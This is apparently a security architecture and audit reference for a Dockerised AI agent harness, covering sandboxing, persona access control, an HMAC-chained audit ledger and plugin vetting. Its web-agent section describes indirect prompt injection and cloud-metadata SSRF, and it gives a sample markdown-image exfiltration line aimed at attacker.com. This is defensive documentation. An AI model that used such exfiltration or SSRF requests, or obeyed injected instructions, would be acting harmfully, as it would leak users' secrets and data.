# 🔒 Security Architecture & Security Audit

> 🏛️ **SOTA Specification**: For the 5-Pillar theoretical model, NIST AI RMF, and OWASP Top 10 for LLMs compliance mapping, see **[SOTA AI Harness Architecture](sota-whitepaper.md)**.

DeepSeek Harness within this Docker stack is designed with multi-layered defensive security controls to protect host files, sensitive credentials, and telemetry traces.

This document serves as both the **Security Architecture Guide** and the **Security Audit Reference**, tracking threat models, known risks, and hardening guidelines.

---

## 🛡️ Executive Summary & Security Posture

* **Overall Posture**: **HARDENED BUT PENDING LIVE VALIDATION** for local deployments. Untrusted shell commands use a dedicated executor in every mode; the sandbox override additionally constrains application egress and writable state. Multi-tenant production use still requires live Linux/Landlock validation and an authenticated edge for the DSH UI.
* **Network Isolation**: Host endpoints (`3080` for DSH, `6006` for Phoenix, and Phoenix OTLP `4317`/`4318`) bind strictly to loopback. Internally, DSH reaches Phoenix only through the telemetry gateway; shell execution has no network namespace.
* **Supply Chain Security**: Base images derive directly from official `node:24-bookworm-slim` with `@deepseek-ai/dsh` installed from official npm, eliminating third-party Docker Hub intermediaries and pinning SHA256 digests.
* **Data Sovereignty**: Observability (Arize Phoenix) runs 100% on-premise; no prompt traces or completion tokens egress to third-party cloud vendors.

---

> 📋 **Audit record**: the four-pass September 2026 adversarial audit — every finding, its
> verification, the regressions the remediations introduced, and the items still open — is
> recorded in **[Consolidated Security Audit — September 2026](../work/done/security-audit-2026-09.md)**.

## 📊 Vulnerability & Risk Matrix (Security Audit)

| ID | Category | Severity | Finding | Status / Remediation |
| :--- | :--- | :---: | :--- | :--- |
| **SEC-01** | **Access Control** | **HIGH** | Unauthenticated DSH Web UI | Phoenix authentication is enabled and its management plane is isolated; the DSH UI remains loopback-only and needs an authenticated reverse proxy for remote or shared-host use. |
| **SEC-02** | **Container Isolation** | **PASS** | Container Execution Privileges & Host Mount Segregation | Remediated in all modes: default unprivileged user `dsh:dsh` (UID 1000), `cap_drop: [ALL]`, `no-new-privileges`, `/etc/dsh:ro`, `/var/lib/dsh:rw`, cgroup limits (`2 CPU`, `4GB RAM`, `512 PIDs`), and dev mount isolation ([ADR 0006](../adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md), [ADR 0008](../adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md)). |
| **SEC-03** | **Credential Security** | **PASS** | Shell Access to Application Secrets | Approved shell commands run in a separate networkless executor with an explicit environment allowlist. Provider keys remain available to trusted in-process plugins; sandbox mode also blanks them in the application container. |
| **SEC-04** | **Least Privilege** | **MEDIUM** | GitHub MCP Server Blast Radius | Restrict GitHub Personal Access Tokens to fine-grained repository scopes. |
| **SEC-05** | **Data Privacy** | **LOW** | Full Prompt & Response Tracing in Phoenix Telemetry | 100% on-premise storage. Switch to `DSH_TELEMETRY_MODE=METRICS_ONLY` for sensitive datasets. |
| **SEC-06** | **Supply Chain** | **PASS** | Zero-Trust Base Image & Official Package Provenance | Built from official `node:24-bookworm-slim`; prebuilt with compilers stripped (`make`, `g++` purged) from runtime runner stage; dependencies pinned via `--frozen-lockfile`; `install_dsh.sh` verifies the release archive against the published `SHA256SUMS` and fails closed unless `DSH_ALLOW_UNVERIFIED_ARCHIVE=1` ([ADR 0008](../adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md)). |
| **SEC-07** | **Zero Trust RBAC** | **PASS** | Cross-Persona Escalation & Host Script Execution | Remediated via declarative `rbac:` contracts and in-line `@dsh-dds/core` PEP blocking unauthorized tools ([ADR 0001](../adr/0001-build-time-immutability-and-rbac.md), [ADR 0006](../adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md)). |
| **SEC-08** | **Immutability** | **PASS** | Runtime Monkey-Patching Configuration Drift | Remediated via native `pnpm.patchedDependencies` and `@dsh-dds/core` Cordis plugin; zero runtime monkey-patch scripts ([ADR 0006](../adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md)). |
| **SEC-09** | **Filesystem Boundaries** | **PENDING LIVE TEST** | Cross-Tenant Command Effects | Shell execution is capability-bound to one canonical workdir and enforced with full Landlock rules in a dedicated executor. The executor refuses partial enforcement; live Linux validation remains mandatory. |
| **SEC-10** | **Execution Boundary** | **PENDING LIVE TEST** | Ambient Process Execution | The PEP defaults closed and routes approved shell calls to a networkless, unprivileged executor with workspace-only mounts and resource limits. |
| **SEC-11** | **Web Agent Confinement** | **PARTIAL** | Indirect Prompt Injection & Cloud Metadata SSRF | Declarative requests validate destinations and sandbox Node traffic uses filtered proxy egress. DNS resolution is not yet pinned to the validated address. |
| **SEC-12** | **Threat Model Demarcation** | **PASS** | Boundary Confusion between Node PEP and Kernel Sandbox | Explicitly demarcated: `loader.mjs` is an internal engine PEP shim; process containment is enforced by Linux kernel cgroups, namespaces, Landlock LSM, and read-only rootfs ([ADR 0008](../adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md)). |
| **SEC-13** | **Cryptographic Integrity** | **PASS** | Default BYOK Master Key Fallback | Remediated: fail-closed master key enforcement (`DSH_VAULT_MASTER_KEY >= 32` chars), payload v2 format, 64KB body limit ([ADR 0009](../adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md)). |
| **SEC-14** | **Identity Spoofing** | **PASS** | Unvalidated Header Trust in Reverse Proxy Mode | Remediated: `x-dsh-user-id` and `x-dsh-user-roles` require `DSH_TRUST_PROXY_HEADERS=true` and trusted socket peer validation via `isTrustedGatewayIp()`; JWT pinned to `HS256` ([ADR 0009](../adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md)). |
| **SEC-15** | **Policy Enforcement** | **PENDING LIVE TEST** | PEP Mapping, Identity, and Shell Dispatch | Tool mapping and missing identity fail closed; request identity is immutable and request-scoped; approved shell calls require short-lived workdir-bound capabilities accepted only by the isolated executor. |
| **SEC-16** | **Host Immutability** | **PASS** | In-Container Code Modification by Agent Process | Remediated: `/app` owned by `root:root` (`0755`) and the `@dsh-dds` scope in the writable profile tree likewise, so the unprivileged `dsh:dsh` agent can tamper with neither the `--import` loader path nor the plugin as resolved by bare specifier. The rest of the profile tree stays writable for profile installs; other bare specifiers are contained by the read-only rootfs in sandbox mode only ([ADR 0009](../adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md)). |

---

## 🔍 Detailed Audit Findings

### 1. [SEC-01] Access Control & Localhost Endpoints
* **Threat Model**:
  - DSH Web Workbench (`http://localhost:3080`) is not an authenticated multi-tenant edge by itself. Phoenix authentication is enabled in Compose, but its bootstrap administrator credentials must be protected and rotated to a scoped ingestion key.
  - While recent upstream versions introduced single-user browser tokens, exposing these ports across `0.0.0.0` or public interfaces exposes the agent to DNS-rebinding, Cross-Site Request Forgery (CSRF), and unauthorized tool execution.
  - Any local untrusted process or malicious browser tab that can reach the loopback DSH UI remains inside the host trust boundary. Phoenix requires authentication, but local browser/session security still matters.
* **Hardening Guideline**:
  - **Loopback Enforcement**: In `docker-compose.yml`, both `3080` and `6006` are strictly bound to `127.0.0.1`, preventing direct LAN or public exposure. Phoenix's service network is internal; DSH can submit only through the fixed-route telemetry gateway.
  - **Secure Remote Access**: If remote access is required, **never expose raw ports to the Internet**. Deploy an authenticated, encrypted transport layer such as **Tailscale**, **Cloudflare Access Tunnels**, or a reverse proxy (Caddy / Nginx) enforcing OAuth2/OIDC authentication.

### 2. [SEC-02] Process Privileges & Host Configuration Mount (Remediated)
* **Threat Model & Prior Vulnerability**:
  - Prior architectures executed as `root` (UID 0) and mounted `./config` as read-write, risking host file clobbering and container escape.
* **Hardened Architecture & Remediation ([ADR 0006](../adr/0006-global-refactoring-non-root-fhs-cordis-plugin.md), [ADR 0008](../adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md))**:
  - **Non-Root Service Execution**: `dsh`, `audit-writer`, `telemetry-gateway`, and `phoenix` run as UID/GID 1000; `isolated-executor` uses distinct UID 11000.
  - **Kernel Privilege Stripping**: `cap_drop: [ALL]` drops all Linux capabilities; `security_opt: [no-new-privileges:true]` blocks privilege escalation.
  - **Resource Cgroups**: Standard DSH limits CPU and memory; the writer, gateway, and executor also have explicit PID, CPU, and memory limits. Sandbox DSH tightens memory and sets a 150-process limit.
  - **Linux FHS Segregation**: `./config` is mounted read-only at `/etc/dsh`; writable sessions, users, storages, patch data, and cache are mounted individually under `/var/lib/dsh`. Profiles use sticky `mode=1777` tmpfs.
  - **Production Immutability**: Development live mounts (`@dsh-dds/core` and `entrypoint.sh`) are segregated into `docker-compose.dev.yml`; standard mode runs purely from immutable container images.
  - **Sandbox Hardening**: For evaluation of untrusted agent workflows, launch with the sandbox override for read-only root filesystems, credential blanking, and isolated named volume session state:
    ```bash
    docker compose -f docker-compose.yml -f docker-compose.sandbox.yml up -d
    ```

### 3. [SEC-03] Credential Security in Container Environment
* **Threat Model**:
  - Sensitive frontier keys (`OPENROUTER_API_KEY`, `GEMINI_API_KEY`, `GITHUB_PERSONAL_ACCESS_TOKEN`) are injected into the application container in standard mode and remain visible to trusted in-process plugins.
  - Shell tools previously inherited that environment and could inspect application process state.
* **Hardening Guideline & Remediation ([ADR 0008](../adr/0008-container-sandbox-hardening-and-supply-chain-remediation.md))**:
  - The turnkey installer enforces `chmod 0600 $DSH_INSTALL/.env` to prevent unauthorized local file reads.
  - In every mode, approved shell commands execute in a separate networkless service with an explicit environment allowlist and no vault, audit, session, application, or Docker-socket mounts.
  - In **Sandbox Mode** (`docker-compose.sandbox.yml`), provider API keys and tokens are additionally blanked in the application container.
  - Avoid sharing execution logs or terminal sessions that output environment variables.
  - Configure spending quotas and rate limits on provider dashboards (OpenRouter FinOps / Google AI Studio).

### 4. [SEC-04] GitHub MCP Server Least Privilege
* **Threat Model**:
  - The official `github-mcp-server` has capabilities to create branches, push code, and update issues and PRs.
  - Supplying a classic GitHub PAT with full `repo` or `admin:org` scope grants the agent excessive write access across all your personal and organization repositories.
* **Hardening Guideline**:
  - Generate a **Fine-Grained Personal Access Token (Beta)** restricted to **Only select repositories**.
  - Grant only *Contents: Read and write* and *Pull requests: Read and write*. Deny repository administration, workflow management, and delete rights.

### 5. [SEC-05] Observability & Telemetry Retention (Data Sovereignty & Cloud APIs)
* **Threat Model**:
  - `DSH_TELEMETRY_MODE=FULL` streams entire multi-turn conversation transcripts, system prompts, tool call parameters, and model reasoning blocks into Arize Phoenix (`./config/phoenix`).
  - If processing confidential files or proprietary datasets, these artifacts persist in local SQLite/parquet databases.
* **Data Sovereignty Boundary & Cloud API Nuance**:
  - **Local Telemetry Invariant**: Telemetry and the GRC ledger remain on the Docker host. DSH sends traces only to a fixed-route gateway; that gateway injects the Phoenix credential and is the only application-network member that can reach Phoenix's internal service network.
  - **Cloud Model API Egress**: When configured to use external cloud LLM providers (e.g. OpenRouter, DeepSeek API, Anthropic Claude, Google Gemini), prompts, file snippets, and tool outputs necessarily transit over TLS to the respective model provider's cloud inference endpoints.
  - **Sovereign Alternative**: For regulated or high-compliance environments, pair DSH-DDS with a local model backend or approved private inference endpoint. A genuinely air-gapped claim additionally requires independently verified network controls and no configured third-party tools or endpoints.
* **Hardening Guideline**:
  - If processing sensitive or non-redactable code, configure in `.env`:
    ```env
    DSH_TELEMETRY_MODE=METRICS_ONLY
    ```
  - Periodically prune or wipe telemetry data:
    ```bash
    rm -rf config/phoenix/*
    ```

### 6. [SEC-07] Zero Trust Identity Isolation & Persona RBAC
* **Threat Model**:
  - Containerization isolates the Docker host from the container, but does not isolate personas from each other.
  - A prompt-injected or compromised persona (e.g. `data-analyst` handling untrusted CSV/SQL) could attempt to read credentials, mutate skills of `security-auditor`, or trigger administrative scripts (`reset.sh`, `install_dsh.sh`).
* **Hardening Guideline & Enforcement**:
  - Every persona manifest (`persona.yaml`) declares a strict `rbac:` policy specifying allowed roles, readable/writable filesystem paths, allowed MCP tools, and explicit `deny` paths.
  - The authoritative policy engine intercepts every workflow step using an immutable request-scoped principal, performs canonical containment and symlink checks, and fails closed if identity, audit receipt, policy, or isolated execution is unavailable.
  - See [ADR 0001](../adr/0001-build-time-immutability-and-rbac.md), [ADR 0004](../adr/0004-in-container-boundaries-and-strict-directory-containment.md), and [ADR 0005](../adr/0005-remediation-of-audit-v3-findings.md).

### 7. [SEC-08] Build-Time Immutability vs. Runtime Monkey-Patching
* **Threat Model**:
  - Dynamically applying code patches in `docker/entrypoint.sh` at container startup introduces non-reproducibility, drift, and divergence between Git state and in-memory application state.
* **Hardening Guideline & Enforcement**:
  - All compatibility shims (`pi-ai` thought-signature preservation and `dsh-bash-local` Landlock auto-workdir creation) are compiled directly into the Docker image layers at build time (`RUN`).
  - `docker/entrypoint.sh` is strictly read-only regarding application code; zero dynamic string mutations or regex patchers execute at container boot.

### 8. [GRC-01] Tamper-Evident GRC Audit Trail & Arize Phoenix Observability
* **Governance Standard & Non-Repudiation**:
  - Enterprise compliance programs commonly require verifiable, durable audit logs of autonomous agent actions. This implementation provides tamper evidence within its documented trust boundary, not cryptographic non-repudiation against a compromised host.
  - Every authorization check evaluated by the Policy Enforcement Point (PEP) produces a structured JSON Lines record capturing both `GRANTED` and `DENIED` decisions along with the evaluation reason. The sample below is an orchestrator-produced record (`config/declarative-orchestrator.mjs`), which carries `step_index` and a propagated `trace_id`; in-line PEP records omit `step_index`:
    ```json
    {
      "timestamp": "2026-09-03T01:32:22.185Z",
      "event_type": "GRC_AUTHORIZATION_DECISION",
      "trace_id": "4b6f12c8a9014e3db856c70129a0e412",
      "persona": "data-analyst",
      "workflow": "analyze_pipeline",
      "step_index": 1,
      "step_name": "Profile Relational Datasets",
      "action": "inspect_sqlite",
      "target": "/workspaces/data.db",
      "decision": "GRANTED",
      "role": "data_analyst",
      "reason": "Policy validated"
    }
    ```

* **Persistence and Trust Guarantees (`audit_grc.jsonl`)**:
  - **Separate writer boundary**: the DSH application submits events to `audit-writer` and has no ledger mount or integrity key. Only the writer mounts `./config/audit` and `./config/audit-checkpoints` read-write.
  - **Fail-closed grants**: authorization grants require a synchronous writer receipt. If the writer, token, ledger, or integrity verification is unavailable, the protected action does not execute. Denials remain best-effort so a writer outage cannot turn malformed requests into an availability attack loop.
  - **Tamper evidence**: entries carry a monotonic sequence plus previous-entry hash and HMAC. A separately mounted checkpoint records the accepted head and detects mutation, deletion, downgrade, and ledger-tail truncation.
  - **Runtime verification**: startup verifies the complete ledger and checkpoint chains. Each append checks that file identity and size are unchanged, with a periodic full-chain verification to avoid quadratic lifetime cost. Offline verification remains required for export and compliance review.
  - **Crash recovery**: if the ledger is exactly one valid HMAC entry ahead of its checkpoint, the writer can reconstruct that checkpoint after a crash. Any broader divergence fails closed. Unhashed legacy records must be archived or migrated before enabling this writer.
  - **Boundary limitation**: the application cannot rewrite history, but a coordinated compromise of the host or writer together with both mounts and the HMAC key can. Use remote or WORM checkpoint publication when that threat is in scope. The bearer token authenticates an application as an event producer; it does not prove that a submitted event is truthful after full application compromise.
  - **Durability limitation**: writes are ordered and fail closed at the application boundary, but they are not a substitute for replicated, `fsync`-verified, disaster-resistant storage.

* **Dual-Layer Architecture: Cold Compliance Ledger vs. Hot Observability Waterfall**:
  To decouple legal compliance from developer observability, DSH-DDS implements a dual-path telemetry architecture:

  ```
                    ┌────────────────────────────────────────────────────────┐
                    │              Autonomous Agent Workflow                 │
                    └──────────────────────────┬─────────────────────────────┘
                                               │
                                     Step Execution / Tool Call
                                               │
                                               ▼
                    ┌────────────────────────────────────────────────────────┐
                    │         In-Line Policy Enforcement Point (PEP)         │
                    │             (packages/dsh-dds-core)                    │
                    └─────────────┬────────────────────────────┬─────────────┘
                                  │                            │
                  synchronous     │              asynchronous  │ OTel POST
                  authenticated   │                            │
                                  ▼                            ▼
                   ┌───────────────────────────┐ ┌───────────────────────────┐
                   │       audit-writer        │ │    telemetry-gateway      │
                   │ ledger + HMAC checkpoint  │ │ fixed route + auth inject │
                   └───────────────────────────┘ └─────────────┬─────────────┘
                                                              ▼
                                                ┌───────────────────────────┐
                                                │  authenticated Phoenix    │
                                                │ internal service network  │
                                                └───────────────────────────┘
  ```

* **Why Arize Phoenix (`:6006`)?**:
  1. **100% Local Data Sovereignty (Zero Data Egress)**:
     - Commercial agent observability platforms (such as LangSmith, Datadog, or AgentOps) transmit complete multi-turn conversation transcripts, system instructions, and tool outputs to external third-party cloud servers.
     - Arize Phoenix runs within a local container (`image: arizephoenix/phoenix:20.5.0`, pinned by SHA256 digest), requires authentication, and exposes its UI only on host loopback. DSH has no direct service-network route to Phoenix.
  2. **W3C OpenTelemetry Native & OpenInference Standard**:
     - Operates as a standard OpenTelemetry (OTel) receiver over standard endpoints (`:4317` gRPC / `:4318` HTTP), eliminating proprietary SDK lock-in.
  3. **Trace Correlation via `trace_id`**:
     - Audit entries embed a 128-bit `trace_id`: the declarative orchestrator propagates its workflow trace id into each step's record, and the in-line PEP generates one per intercepted action.
     - When a policy violation occurs (`DENIED`), an operator can query that `trace_id` in Arize Phoenix to inspect the prompt waterfall, intermediate thought signatures, latency, and context leading to the attempted unauthorized action.
     - The id is generated with `crypto.randomBytes(16)`, not derived from a clock; correlation therefore holds under concurrency.
  4. **Zero External Database Dependencies**:
     - Self-contained with an embedded SQLite/Parquet backend in a single container. Unlike Jaeger or Langfuse, it requires no auxiliary PostgreSQL, ClickHouse, Redis, or Elasticsearch clusters.
  5. **FinOps & Token Cost Tracking (OWASP LLM10 Defense)**:
     - Continuously calculates exact token consumption and costs across 420+ models (OpenRouter, DeepSeek, Google AI Studio) in real time, defending against runaway reasoning loops or prompt-injection-driven spend anomalies.
  6. **Automated Trajectory & Safety Evaluation**:
     - Integrates with `TrajectoryEvaluator` to compute continuous safety and compliance scores (0.0 to 1.0) and emit evaluation spans directly into the Phoenix trace waterfall.

* **Audit Ledger vs. Phoenix Observability Comparison**:

| Dimension | `audit_grc.jsonl` | Arize Phoenix (`:6006`) |
| :--- | :--- | :--- |
| **Architectural Role** | Cold compliance ledger & CI assertions (operator-controlled retention) | Hot interactive distributed tracing & debugging (14-day retention) |
| **Storage Backend** | HMAC-chained JSON Lines plus head checkpoint on separate host mounts | Embedded SQLite/Parquet on a host bind mount (`./config/phoenix`) |
| **Execution Path** | Synchronous authenticated request to a separate writer; grants fail closed | Asynchronous OTel stream through a fixed-route credential-injecting gateway |
| **Primary Audience** | Legal auditors, SIEM pipelines, security automation | Developers, prompt engineers, DevOps operators |
| **Consumption Interface** | CLI tools (`jq`, `grep`), log aggregators | Visual web dashboard (`http://localhost:6006`) |
| **Correlation Key** | W3C `trace_id` (128-bit hex) | W3C `traceId` / `spanId` hierarchy |


### 11. [SEC-11] Web Browsing Agents & External Data Ingestion Risks
* **Threat Model**:
  - Web-browsing agents (e.g., using `mcp-fetch` or web search tools) ingest untrusted external HTML/DOM, introducing **Indirect Prompt Injection** (malicious hidden instructions hijacking agent control flow).
  - An attacker could trick the agent into performing **Server-Side Request Forgery (SSRF)** against cloud metadata endpoints (`http://169.254.169.254/latest/meta-data/`) or private internal networks (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).
  - Covert exfiltration via markdown image tags (`![leak](https://attacker.com/leak?data=...)`).
* **Hardening Guideline & Mitigations**:
  - **Hermetic Extraction**: The `mcp-fetch` adapter strips active scripts, inline styles, and embedded DOM iframes, converting content into sanitized plain markdown.
  - **Filtered Egress**: In sandbox mode, supported Node HTTP clients are forced through digest-pinned Envoy 1.39.1 by `NODE_USE_ENV_PROXY=1`; the application network is internal and only the egress sidecar bridges outward. Envoy's `resolved_address_filter` removes private, reserved, loopback, link-local, multicast, documentation, and IPv4-mapped DNS results from the same cache used to select the upstream socket.
  - **Connection-Bound DNS Validation**: declarative requests in standard mode connect through a custom lookup that returns only the twice-validated address set. Sandbox public requests use Envoy's connection-time DNS filter. Redirects repeat the full validation and connection-binding process; untrusted HTTPS tunnels are denied, while CONNECT is limited to explicitly trusted domains.
  - **Host Loopback Protection**: Critical host services bind to `127.0.0.1`. Phoenix additionally requires authentication and is isolated from the DSH service network behind the telemetry gateway.

### 12. [SEC-13] Cryptographic Integrity & Fail-Closed BYOK Vault
* **Threat Model & Prior Vulnerability**:
  - `packages/dsh-dds-core/byok-vault.js` fell back to a default constant string when `DSH_VAULT_MASTER_KEY` was missing, leaving encrypted user API keys vulnerable to decryption with public repository knowledge.
* **Remediation & Hardening ([ADR 0009](../adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md))**:
  - `ByokVault` strictly requires `DSH_VAULT_MASTER_KEY >= 32` characters; missing or short secrets fail closed with `VAULT_MASTER_KEY_MISSING`.
  - Payloads upgraded to `version: 2`; `decryptSecret` refuses legacy v1 blobs.
  - REST API `/dsh-dds/api/vault/keys` enforces a 64 KB maximum payload limit and socket destruction on overflow.
  - Turnkey installer automatically generates a 32-byte hex secret during `.env` creation; `./dsh.sh doctor` reports hard failure if key is absent.

### 13. [SEC-14] Identity Spoofing & Gateway Peer Verification
* **Threat Model & Prior Vulnerability**:
  - Reverse proxy identity headers (`x-dsh-user-id`, `x-dsh-user-roles: admin`) were accepted without checking the requesting socket peer address.
* **Remediation & Hardening ([ADR 0009](../adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md))**:
  - Extracted network peer trust verification into `packages/dsh-dds-core/net-trust.js`.
  - Reverse proxy headers are ignored unless `DSH_TRUST_PROXY_HEADERS=true` and `isTrustedGatewayIp(remoteAddress)` verifies the caller is loopback or an internal Docker bridge.
  - JWT bearer token authentication strictly enforces `alg: HS256`.

### 14. [SEC-15] Zero-Trust PEP Action Mapping & Fail-Closed Identity
* **Threat Model & Prior Vulnerability**:
  - Raw tool names (`bash`, `write_file`, `edit_file`) diverged from declarative workflow verbs (`run_shell`, `create_file`, `modify_file`), resulting in unmapped actions defaulting to unclassified execution.
  - In-line PEP granted admin role when caller user context was omitted.
* **Remediation & Hardening ([ADR 0009](../adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md))**:
  - `TOOL_ACTION_MAP` maps agent tool names directly to policy verbs.
  - `run_shell` is classified as a write action in `config/rbac-policy.mjs`, enforcing strict directory boundaries on shell operations.
  - Missing identity context immediately fails closed with `[Zero-Trust RBAC Violation] Missing authenticated user identity context`.
  - Multi-tenant boundary checks normalize all string targets against `/workspaces/users/<userId>` and `/workspaces/shared`.

### 15. [SEC-16] Container Application Code Immutability
* **Threat Model & Prior Vulnerability**:
  - Although the process executed as unprivileged `dsh:dsh` (UID 1000), `dsh` owned `/app`, allowing an in-container compromise to rewrite `NODE_OPTIONS` loader shims or policy enforcement points.
* **Remediation & Hardening ([ADR 0009](../adr/0009-vault-fail-closed-identity-peer-trust-and-pep-mapping.md))**:
  - In `Dockerfile`, `/app` is chowned to `root:root` with permissions `chmod -R 755 /app`.
  - The runtime process (`dsh:dsh`) can read and execute application files, but cannot modify in-memory interception or policy validation code on disk.

---

## 🛡️ Hardened Sandbox Mode (`docker-compose.sandbox.yml`)

When using DSH to analyze external or unverified code repositories, start with the sandbox override:

```bash
docker compose -f docker-compose.yml -f docker-compose.sandbox.yml up -d
```

### Sandbox Protections Matrix

| Control | Standard Mode (`docker-compose.yml`) | Sandbox Mode (`sandbox.yml`) | Development Mode (`docker-compose.dev.yml`) |
| :--- | :--- | :--- | :--- |
| **Root Filesystem** | Writable | **Read-Only (`read_only: true`)** | Writable |
| **Linux Capabilities** | **Application capabilities dropped; executor UID has no effective capabilities and retains `SYS_ADMIN` only in its bounding set to enter a nested user namespace** | **Same executor boundary** | **Same executor boundary** |
| **Privilege Escalation** | **Blocked (`no-new-privileges: true`)** | **Blocked (`no-new-privileges: true`)** | **Blocked (`no-new-privileges: true`)** |
| **Host Config Mount** | **Read-Only (`./config:/etc/dsh:ro`)** | **Read-Only (`./config:/opt/dsh-config:ro`)** | **Read-Only (`./config:/etc/dsh:ro`)** |
| **Application Workspace Mount** | Read-only base plus writable cases/artifacts | **Read-Only (`./workspaces:ro`) plus disposable cases/artifacts tmpfs** | Inherits standard plus development mounts |
| **Shell Workspace Mount** | Dedicated executor mounts users/cases read-write and shared read-only | Same networkless executor with tighter limits | Same dedicated executor |
| **GRC Audit Retention** | External writer owns persistent ledger and checkpoint mounts; Phoenix spans retained 14 d | Same external writer boundary and persistence; DSH has no audit mount | Same external writer boundary plus Phoenix spans |
| **Session & State Storage** | Persisted on host (`./config/sessions`, `./config/storages`) | **Isolated Named Volume (`sandbox-session-state:/var/lib/dsh-state:rw`)** | Persisted on host |
| **Container Networking** | DSH runtime bridge; executor has no network; Phoenix internal behind gateway | **No direct DSH egress; supported Node traffic crosses Envoy; executor has no network** | Inherits standard topology |
| **Resource Constraints** | **Limits (`2.0 CPUs`, `4GB RAM`, `512 PIDs`)** | **Strict Limits (`2.0 CPUs`, `2GB RAM`, `150 PIDs`)** | Inherits standard limits |
| **Provider Credentials** | Injected via `.env` | **Explicitly Blanked (`dummy / empty`)** | Injected via `.env` |
| **Developer Code Mounts** | **None (Immutable Image)** | **None (Immutable Image)** | **Live Mounts (`@dsh-dds/core`, `entrypoint.sh`)** |
| **Compilers in Image** | **Purged (`make`, `g++` stripped)** | **Purged (`make`, `g++` stripped)** | Purged in runner stage |

The executor serializes commands as a conservative availability control and wraps each command
in a per-invocation user/PID namespace (`unshare --user --map-root-user --pid --fork
--kill-child=SIGKILL`) before
applying Landlock. The service UID has no effective capabilities; `SYS_ADMIN` is retained only in
its bounding set so Docker's default seccomp gate admits creation of the nested user namespace.
Landlock then denies `/proc` and all paths outside the explicit command grants. A startup probe
executes the complete namespace-plus-Landlock sequence and refuses service startup if either
primitive is unavailable.

To destroy all transient sandbox session data:
```bash
docker compose -f docker-compose.yml -f docker-compose.sandbox.yml down -v
```

---

## ⚠️ Mandatory Plugin & Supply Chain Auditing Policy

Plugins and MCP tool servers in DeepSeek Harness execute directly within the Node.js container runtime with full access to mounted workspaces, environment variables, and system tools.

### Why Every Added Plugin Must Be Audited
* **In-Process Runtime Execution**: DSH plugins load as dynamic Node.js/Cordis modules. An unvetted or malicious plugin executes with the same privileges as the agent itself.
* **Credential Protection**: Although environment variables are protected from external network traffic, any in-process plugin can access `process.env` (including `GEMINI_API_KEY`, `OPENROUTER_API_KEY`, and `GITHUB_PERSONAL_ACCESS_TOKEN`).
* **Supply Chain Attack Vectors**: Third-party npm packages can introduce compromised lifecycle scripts (`preinstall`, `postinstall`), unvetted transitive dependencies, or covert data-exfiltration logic.

### Pre-Installation Audit Checklist
Before adding any community plugin to `config/profiles/web/package.json` or installing via `dshmarket`:
1. **Source Code Inspection**: Review the plugin's source repository for obfuscated code, arbitrary `eval()`, or unexpected HTTP/WebSocket outbound connections.
2. **Lifecycle Scripts Verification**: Ensure the package's `package.json` does not declare suspicious `preinstall`, `install`, or `postinstall` hooks.
3. **Lockfile & Version Pinning**: Always pin strict versions in `package.json` and verify that dependencies resolve deterministically via `pnpm-lock.yaml`.
4. **Static Sandbox Policy**: When evaluating untrusted external code, never install new or unverified plugins dynamically; keep the plugin set minimal, fixed, and fully vetted.

---

## 📋 Security Best Practices Checklist

- [x] Ensure `.env` is never committed to Git (verified in `.gitignore`).
- [x] Keep `.env` permissions set to `0600` (`chmod 0600 .env`).
- [x] Use fine-grained GitHub PATs scoped strictly to individual repositories.
- [x] Enforce `docker-compose.sandbox.yml` when handling untrusted code or external inputs.
- [x] Thoroughly audit all third-party plugins and MCP servers before adding them to the environment.
- [x] Set spending caps on API provider accounts to prevent FinOps anomalies.
- [x] Run `./dsh.sh doctor` to regularly audit credentials, permissions, and network bindings.
